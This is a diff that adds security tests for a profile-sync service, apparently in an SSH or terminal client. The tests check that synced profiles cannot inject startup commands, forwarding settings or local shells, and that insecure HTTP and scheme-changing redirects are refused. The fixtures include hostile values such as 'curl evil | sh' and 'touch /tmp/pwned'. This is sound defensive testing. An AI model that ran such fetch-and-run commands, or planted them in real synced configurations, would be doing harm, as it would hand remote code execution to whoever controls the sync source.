@@ -183,3 +183,56 @@ test('ProfileSync supports an SSH/SFTP profile source without sharing credential
   assert.equal(store.list().find((profile) => profile.name === 'Team host').credentialId, '');
   sync.stop();
 });
+
+test('ProfileSync never lets a sync source plant commands, forwarding or local shells', async () => {
+  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
+  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aux-sync-test-'));
+  try {
+    const syncFile = path.join(tmpDir, 'profiles.json');
+    const store = createMockStore();
+    store.save({ id: 'mine', name: 'Prod', protocol: 'ssh', host: 'prod.example.com', port: 22, startupCommand: 'tmux attach', agentForwarding: false });
+    fs.writeFileSync(syncFile, JSON.stringify([
+      { name: 'Prod', protocol: 'ssh', host: 'prod.example.com', port: 2222, startupCommand: 'curl evil | sh', agentForwarding: true, x11Forwarding: true, proxyJump: 'evil.example', identityFile: '/dev/zero' },
+      { name: 'New', protocol: 'ssh', host: 'new.example.com', startupCommand: 'id', agentForwarding: true }
+    ]));
+    const sync = new ProfileSync(store, noopWindow);
+    sync.configure({ type: 'file', url: syncFile });
+    await sync.syncNow();
+    const prod = store.list().find((p) => p.name === 'Prod');
+    assert.equal(prod.port, 2222, 'shared connection details still sync');
+    assert.equal(prod.startupCommand, 'tmux attach');
+    assert.equal(prod.agentForwarding, false);
+    assert.ok(!prod.x11Forwarding && !prod.proxyJump && !prod.identityFile);
+    const added = store.list().find((p) => p.name === 'New');
+    assert.ok(!added.startupCommand && !added.agentForwarding);
+
+    fs.writeFileSync(syncFile, JSON.stringify([{ name: 'me@localhost', protocol: 'local', host: '', startupCommand: 'touch /tmp/pwned' }]));
+    await assert.rejects(sync.syncNow(), /local shells are never synchronized/u);
+  } finally {
+    fs.rmSync(tmpDir, { recursive: true, force: true });
+  }
+});
+
+test('ProfileSync allows plain HTTP only for this computer', () => {
+  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
+  const sync = new ProfileSync(createMockStore(), noopWindow);
+  assert.throws(() => sync.configure({ type: 'http', url: 'http://sync.example.com/profiles.json' }), /only allowed for localhost/u);
+  assert.equal(sync.configure({ type: 'http', url: 'http://127.0.0.1:8080/profiles.json' }).type, 'http');
+  assert.equal(sync.configure({ type: 'https', url: 'https://sync.example.com/profiles.json' }).type, 'https');
+  sync.disable();
+});
+
+test('ProfileSync refuses redirects that change the configured scheme', async () => {
+  const http = require('node:http');
+  const { ProfileSync } = require('../src/main/services/profile-sync.cjs');
+  const server = http.createServer((_request, response) => { response.writeHead(302, { location: 'http://sync.example.com/profiles.json' }); response.end(); });
+  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+  const sync = new ProfileSync(createMockStore(), noopWindow);
+  try {
+    sync.configure({ type: 'http', url: `http://127.0.0.1:${server.address().port}/profiles.json` });
+    await assert.rejects(sync.syncNow(), /Sync redirect refused/u);
+  } finally {
+    sync.disable();
+    await new Promise((resolve) => server.close(resolve));
+  }
+});
